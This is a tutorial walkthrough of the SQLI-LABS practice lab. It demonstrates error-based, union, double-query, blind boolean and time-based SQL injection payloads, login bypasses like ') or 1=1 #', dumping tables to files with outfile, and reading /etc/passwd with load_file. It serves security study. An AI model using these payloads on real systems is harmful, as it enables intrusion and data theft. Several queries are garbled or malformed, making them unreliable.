# SQLI-LABS

# Introduction:

**Some Info..... **

An attacker always checks SQL injection vulnerability using a comma (‚Äò) inside URL  to break the statement in order to receive a SQL error message. It is a fight between the developer and attacker, the developer increases the security level and the attacker tries to break it. This time developer had blocked error message as the output on the website. Hence if the database is vulnerable to SQL injection then the attacker does not obtain any error message on the website. The attacker will try to confirm if the database is vulnerable to Blind SQL Injection by evaluating the results of various queries which return either TRUE or FALSE.




**SQLI labs to test error based, Blind boolean based, Time based.**

**Structured Query Language**, also known as **SQL**, is basically a programming language that deals with databases.
For beginners, databases are simply data stores that contain both **client side** and **server side** data. **SQL** manages databases through structured queries, relations, object oriented programming, etc.

Programming geeks will have come across many such types of software, like **MySQL, MS SQL, Oracle, and Postgresql**.
These are a few of the programs that give us the capability to manage large databases/data stores through **structured queries**.

The lab we will be using for demonstration is SQLi Labs, which can be freely downloaded from https://github.com/Sushant15/sqli-labs solely for the purpose of studying and making applications safe from such vulnerabilities.

  **Lets GO to Explore**üòÑüòÑ
  **Let‚Äôs start!!**

  Using Dhakkan we will demonstrate injection.
  
  **Labs:**

  **Lesson 1: GET ‚Äì Error-Based ‚Äì Single Quotes ‚Äì String**

You get a **‚ÄúWelcome Dhakkan‚Äù** (a Hindi slang word that usually refers to a stupid person). The programmer for SQLI Labs definitely has a good sense of humor. Now we get a parameter ‚Äúid‚Äù with numeric value injection.
We have the login name Dumb and the password is Dump. So basically we added a parameter to the URL and pointed that parameter to the first record. There was an immediate query from the browser to the database table to fetch the record for id=1. Similarly, you can fire the query for subsequent records like 2, 3, 4‚Ä¶.
Here is the actual query which ran at the back end:

Main Query is working from back is this..
**Select * from TABLE where id=1;**

If Someone can think out of the box and give input as some other character.... Then what should we do..


In this we have to understand the query as it has quotes between 1 but by seeing it carefully it is the double qoutes in between the numbers.

**    ‚Äò             1‚Äô      - -   ,   # ,   /*         */ ‚Äò  LIMIT 0,1**


  %20      for.    spaces\
  %23      for.     # 

After putting - - symbol as we are working with the URL we have to encode it in the URL base.
OR it should be URL encoded‚Ä¶.\

When we uses - - to comment out rest of the query then we need to provide extra space after the double  - - , if not it will not work‚Ä¶.\
As this is the injection through URL  so we have to URL encode the # sign‚Ä¶
And URL encode for. # symbol is %23‚Ä¶.\
The developer has already enclosed two quotes around what ever we input‚Ä¶






  **Lesson 2: GET ‚Äì Error-Based ‚Äì Integer-Based**
  
Now we try to attack the application similarly by putting in strings such as ‚Äúabc‚Äúand ‚Äúabcd.‚Äù We observe that for lesson 2 we receive an error from the database. Next we do a bit of tampering with the number and add a ‚Äò (single quote) with the number.
We again get an error in the Mysql server for incorrect syntax.
**You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‚Äò\‚Äô LIMIT 0,1‚Ä≤ at line 1**

Now the query which it changes to is

**Select * from TABLE where id = 1‚Äô ;**

So we have an odd number of single quotes (‚Äò), which breaks the query and also string input throwing error.
Hence the result we come out with is that the coder has used integer for the query.

**Select * from TABLE where id = (some integer value);**
To add protection from such errors we can comment out the rest of the query:

**To be Noted** üòÇ\
You Have to Add a space after the comments or URL encoded space (%20) or else the comment will not work.



**Lesson 3: Error-based single quotes with twist ‚Äì string**

In this lesson we will learn to perform an error-based single quote attack. First we try to attack the application similarly by putting some strings and number to check how the query is working using the message which is displayed on the screen in lesson 3 .
**For example ?id='**
After injecting the code we got an error message like...
Server version for the right syntax to use near ‚Äù‚Äù) LIMIT 0,1‚Ä≤ at line 1

Here it means that the developer has used the query which is..
**Select login_name, select password from table where id= (‚Äòour input here‚Äô)**

**So again we inject the code with this ?id=1‚Ä≤) ‚Äì+**
We are able to get through with the username and password and the query has been commented out.




**Lesson 4: Error-Based Double Quotes String**

In this lesson we will learn to perform an error-based double quotes string. First we try to attack the application similarly by putting some strings and number to check how the query is working using the message which is displayed on the screen in lesson 4.

**For example ?id="**
After injecting the code we got an error message like.....
Server version for the right syntax to user near  '"1"") LIMIT 0,1' at line 1

Here it means that the developer has used the query which is...
**Select login_name, password from table where id= ("our input here ")**

So here we have to deal with the double quotes 

**So again we inject the code with this ?id=1") --+**
We are able to get through with the username and password and the query has been commented out.




**Lesson 5(Not less-5) : Fixing the query without using comments**

In this lesson we will learn to perform an error-based double quotes injection attack as **?id=1‚Ä≤ AND ‚Äò2 OR ?id=3‚Ä≤ AND ‚Äò4**

After injecting this type of code, the database always shows different usernames and passwords. Now we use the union select command to get more sensitive information from the database.\
**-6‚Ä≤ union select 5, version(),3 AND ‚Äò1**

In this query we use the version() function for detecting the database version; similarly, we can use another different query for retrieving more information from database.\
**-6‚Ä≤ union select 5,current_user,3 AND ‚Äò1**



**Lesson 6 : Double Query Injection**

In this lesson we will learn to perform an Error-based Double Query Injection Attack as **?id=1 \ or id=1'** whether we see What the developer has put in if the query is breaking we put **1'** .
To check it whether it is correct or not or it is showing the result as it is in the databases we comment out the query and see that it is working or not.... 

Using **--+** symbol.....

We can see that the query is being follwed at the back is **Select col1,col2,col3 from table where id='3   '  OR '1   '**


These are the some Query which I have used in msql:

**select count(*) from information_schema.tables;**

**select rand() ;**

**select table_name, table_schema from information_schema.tables group by table_schema**

**select database();**

**select concat((select database()));**

**select concat(0x3a,0x3a(select database()),0x3a,0x3a);**

**select concat(0x3a,0x3a(select database()),0x3a,0x3a) a;**

**select concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a;**

**concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns;**

**select concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a from information_schema.tables;**

**select count(*), concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a from information_schema.tables group by a;**

**select count(*), concat(0x3a,0x3a(select version()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns group by a;**


**select count(*), concat(0x3a,0x3a(select user()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns group by a;**



**Lesson 7: Dumping database using out file**

In this lesson, we will learn how to dump the database by using outfile. Let us start by breaking the sql query like this: **?id=1‚Ä≤‚Äì+**

Now I would like to discuss some functions at the back end. Start mysql at your terminal and use the database security:
**use security;**
Let us dump the database with basic commands: **select * from users;**
Now dump the database and ask mysql to write it into a file by using a function called outfile, so the query is
**select * from users into outfile ‚Äú/tmp/tests.txt‚Äù;**


So we can see there is another function, which is known as dump file. Dump file uses only a single row so we have to give it a limit for dumping the database:

**select * from users limit 0,1 into dumofile "/tmp/text2.txt"**

Another function which is used is load file. It is used for loading files from the file system into mysql. Here is the query:

**select load_file("etc/passwd")**






**Lesson 8: Blind Boolean-based single quotes**

Their so many ways to hack the database using SQL injection as there are some  Error based attack, login formed based attack and much more different type of attack in order to retrieve information from the inside database. In the same way we will learn a new type of SQL injection attack known as Blind Boolean based attack.


Lesson 8 is regarding blind boolean based injection therefore first we need to explore **http://localhost:81/sqli/Less-8/?id=1** on the browser, this will send the query into the database.

**SELECT * from table_name WHERE id=1**

As output, it will display ‚Äúyou are in‚Äù the yellow colour text on the web page as shown in the given image.
When an attacker tries to break this query using a comma (‚Äò) http://localhost:81/sqli/Less-8/?id=1‚Äô

In this lesson we will learn to perform blind injections. Let us start from enumeration and try to break the query:

**?id=1‚Ä≤ ?id=1\)**

After injecting some queries we see that we do not have an error message on the screen. Hence we are not sure here that the injection exists on this page or not. That is why this type of injection is called blind injection. 

There are two types of blind injection, **Boolean-based and time-based injections.**

Then attacker will go for blind SQL injection to make sure, that inject query must return an answer either true or false.

**SELECT * from table_name WHERE id=1' AND 1=1**

Now database test for given condition whether 1 is equal to 1 if the query is valid it returns TRUE, from the screenshot you can see we have got yellow colour text again ‚Äúyou are in‚Äù, which means our query is valid.

**SELECT * from table_name WHERE id=1' AND 1=0**

Now it will test the given condition whether 1 is equal to 0 as we know 1 is not equal to 0 hence database answer as ‚ÄòFALSE‚Äô query.

**http://localhost:81/sqli/Less-8/?id=1' AND (length(database())) = 1 --+**


**http://localhost:81/sqli/Less-8/?id=1' AND (length(database())) = 2 --+**

Again we can see that when we use length(database() ==2 --+ it has return FALSE to reply NO the length of database string is not equal to 2.

**http://localhost:81/sqli/Less-8/?id=1' AND (length(database())) = 8 --+**
when I test for the string is equal to 8; it answers as true and as result yellow colour text ‚Äúyou are in‚Äù appears again.
This means I am going in right direction.

So we we take help of ASCII code ....

As we know the computer does not understand the human language it can read the only binary language, therefore, we will use ASCII code. The ASCII code associates an integer value for all symbols in the character set, such as letters, digits, punctuation marks, special characters, and control characters

Next query will ask from database test the condition whether the first string of database name is greater than 100 using acsii substring.

**http://localhost/sqli-labs/Less-8/?id=1' AND (ascii(substr((select database()),1,1))) > 100--+**
It reflects TRUE condition hence if you match the ascii character you will observe that from 100 small alphabets string has been running till 172. Really I don't know...just a number üòÇüòÇ

**http://localhost/sqli-labs/Less-8/?id=1' AND (ascii(substr((select database()),1,1))) > 120--+**
Similarly, it will test again whether the first letter is greater than 120. But this time it returns FALSE which means the first letter is greater than 100 and less than 120.

**http://localhost:81/sqli/Less-8/?id=1' AND (ascii(substr((select database()),1,1))) = 101--+**

Now next it will equate first string from 101, again we got FALSE...

**http://localhost/sqli-labs/Less-8/?id=1' AND (ascii(substr((select database()),1,1))) = 115--+**

Finally receive a TRUE reply at 115 which means the first string is equal to 115, where 115 =‚Äòs‚Äô..
















To start from basic sql commands :


**use security;**


Now we introduce a new function, length:


**select length(database());**


**select substr(database(),1,1);**


We use a new function called ASCII function. This function is used for getting the ASCII value of a string. This will make easier for us to detect the first letter of database, as shown in the screenshot below. We have a value of 115 and the query used is:

**select ascii(substr(database(),1,1));**


Next we check this query:

**select ascii(substr(database(),2,1)) < 101;**

The result is false because it is equal to 0, since the ASCII value is not less than 101. Let us try to guess the 3rd character by this query:


**select ascii(substr(database(),3,1)) < 101;**

And the result is 1, meaning true. So make it 97 then. Use

**select ascii(substr(database(),3,1)) < 97;**

And the result is 0; it means false, hence the valid value lies between 97 and 101. So now keep trying to guess all values from 97 to 101.

We get the 3rd value which is 99 and check it in the ASCII table sheet.

Now we use this query in the URL:

**?id=1‚Ä≤ AND (ascii(substr((select database()) ,3,3)) = 99 ‚Äì+**

After that u will get this....

**You are in....**

It means the value 99 is true.

Let us see what happens if we change the value 99 to 98:

**?id=1‚Ä≤ AND (ascii(substr((select database()) ,3,3)) = 98**

We see that nothing happens on screen and we conclude that we get a false.

Now we start to enumerate the database. The query is

**id=1‚Ä≤ AND (ascii(substr((select table_name information_schema.tables where table_schema=database()limit 0,1) ,1,1)) < 105 ‚Äì+**

and we see a message you are in.......

It means true.

Now let us try value 101:

**id=1‚Ä≤ AND (ascii(substr((select table_name information_schema.tables where table_schema=database()limit 0,1) ,1,1)) = 101 ‚Äì+**

And we see a message that **You are in....**

It means the 1st letter is E for Email.

I received a TRUE reply at 101 which means the second string is equal to 101 and 101 = ‚Äòe‚Äô.
Similarly, I had performed this for all eight strings and got the following result:
Given query will test the condition whether the length of string for the first table is equal to 6 or not.

**http://localhost/sqli-labs/Less-8/?id=1' AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 6 --+**

In reply we receive TRUE and text ‚Äúyou are in‚Äù appears again on the web site.

Similarly I test for second and third table using same technique by replacing only table number in same query.

1 = s = 115

2 = e = 101

3 = c =99

4 = u =117

5 = r =114

6 = i = 105

7 = t = 116

8 = y = 121



**Table string length**

We have to use the same technique for enumerating information of the table from inside the database. Given query will test the condition whether the length of string for the first table is greater than 5 or not.

**http://localhost/sqli-labs/Less-8/?id=1' AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) > 5 --+**






















**Lessons 9 & 10: Blind injection time-based**

Lab 9 does not give us a signal or an error that we have tampered the query, which results in Mysql error. So now it makes us check whether SQL injection is possible.

Here we introduce how to use the sleep command in Mysql. What we see from the command that we get a response 10 sec after running the query, so the Mysql sleeps for 10 seconds.


Now when we run another query select if **((select database()=‚Äùsecurity‚Äù, sleep(10), null);** we get the response 10 seconds after giving us the result that a database security exists. This is also known as a time-based SQL query.


Similarly if we try to run the query select if **((select database()=‚Äùsecuri‚Äù, sleep(10), null);**
there is no time-based response from the SQL server which means that such a database does not exist.



**Lessons 11 & 12: Post Error-based single & double quotes**


Lesson 11 is regarding POST error based single quotes (‚Äò) string so when I explore this lab on the browser I observe that it contains a text field for username and password to login inside web server. As I am not a true user so I don‚Äôt know the correct username and password but being hacker I always wish to get inside the database with help of SQL injection. Therefore first I will test whether the database is vulnerable to SQL injection or not.

So we when breaking the query we get an error message, now let me explain what this error message says.

The right syntax to use near **‚Äù‚Äù and password=‚Äù LIMIT 0,1‚Äô**

Now we need to fix this query with help of # (hash) comment; so after adding single quotes (‚Äò) add a hash function (#) to make it syntactically correct.

Username:  ‚Äò   #

Now whatever statement I will insert in between ‚Äòand # the query will execute successfully with certain result according to it. Now to find out the number of columns used in the backend query I will use order by clause...

**Username:  ' order by 2 #** //

**Username:  ' order by 3 #**

Similarly, insert query for union select in between ‚Äòand # to select both records

**' union select 1,2 #**

Next query will fetch database name, it is as similar as in lesson 1 and from the screenshot, you can read the database name ‚Äúsecurity‚Äù

**' union select 1,database() #**




In Lessons 11 & 12 we come to error-based SQL Injections in HTML forms. So we have a login page and we try to login using **username=‚Äùadmin‚Äù password=‚Äùpassword‚Äú**. We get a failed login attempt response.

Now we try the query again, using **username=‚Äù ‚Äò ‚Äù and password= ‚Äù ‚Äò ‚Äú** (single quotes). We get a login failed attempt again.
Similarly, the failed login error appears for double quotes for both username and password. But when we enter a double quote for just the username the SQL breaks and has an error.

When we use a backslash (/) we get a better understanding of the query. We come to the result that we have a double quote followed by the bracket. Hence we have successfully derived the query. So the knowledge we take out from this result is that the developer has used the query.

**Select * from TABLE where username= (‚Äú$uname‚Äù) and password=(‚Äú$password‚Äù) LIMIT 0,1**

Now in order to fix the query so that it works, we can balance the quotes or comment out the rest of the query. So I comment out the rest of my query in the username field.
Now as I press enter, it becomes a valid query though we are not able to login and it does not give us an error message.

Now we alter the username to **‚Äú) or 1=1 #:**

And we are successfully able to login. 

Similarly, we may get the records for the second user through the username **‚Äú) or 1=1 LIMIT 2,1 #**

The query simply checks for the second OR condition, validates the user, and prints the record of the second row.


**Lessons 13 & 14: Double-injection single quotes with string**

Now I will demonstrate Lesson 14 and leave Lesson 13 for readers to practice. It uses the same mechanism as we have used in this lab.


Inputting a large number or a single quote as a username and password does not work. It still gives us a ‚ÄúLogin Attempt Failed‚Äù message.
Now we try the double quotes in the username and voila, the query breaks.

So what we can infer from this error message is that there is

**‚Äò ‚Äú/‚Äù and password=‚Äù ‚Äù LIMIT 0,1 ‚Äò at line 1**

Now we use ‚Äù or 1 # to bypass the login and we have success. The reason is that the 1 used after OR resolves to true and as a result we have successful query. The password is not matched since we commented out the rest of the query.

**Success!!**

Now we move on to the next query, which is **Select concat((select database()));.**
This basically selects the database and dumps it as a string. If we add the floor and random function to it, it becomes **select concat((select database() ), floor(rand(0)*2 ));**

And we have security being concatenated in the output:
We use the information schema table as covered previously to build our query further: **select 1 from (select concat(*), ( concat((select database() ), floor(rand(0)*2 ))c from information_schema.tables group by c)a;**

And we use it on the username. Please remember to concat your query so that the query gets executed.



**Lessons 15 & 16: Blind Boolean time-based with single and double quotes.**

So now we move on to POST Parameter Blind-based Boolean injections which are like 1 or 1=1,  1 AND 1=1, which means for the first query we have the Boolean value 1 and for the second we also have the Boolean value 1.. which equals to TRUE, since an AND function is involved. In order to bypass the lab session 16 we use ‚Äú) or (‚Äú1‚Äù)=‚Äù1 for bypassing the login. We comment the query by using # if we just want to enter the username.

Now we move on to our next demonstration using Boolean-based blind SQL injections. This time we form the query ‚Äú) or AND sleep(15) # but the query gets no response. We try to correct our query by using ‚Äú) or OR sleep(15) #

The query eventually becomes



**select col1, col2 from TABLE where username= (‚Äù ‚Äú) or sleep(15)‚Äù) and password=(‚Äù user data‚Äù);**

Now since the **‚Äú)** does not result in TRUE, the AND statement fails and the OR statement executes successfully. Now if we change our AND query to **admin‚Äù) or OR sleep(15)** # we have a valid query and it results in TRUE, so our query gets successfully executed...



**Lesson 17 & 18 : INJECTION IN THE INSERT QUERY & INJECTION IN HEADERS**


In the earlier parts of the series we looked at the GET and POST based injections and dived into details on error based SQL Injections (string type, Integer type), Double Query injections error based, Blind injections (Boolean based and Time based) or use the outfile/dumpfile to dump the info in text files . In this part we would look at the injections in the Insert Query. For this we would look at the Less-17.
A general update query looks like

**INSERT INTO table (col1,col2, col3) values (val1,val2, val3);**
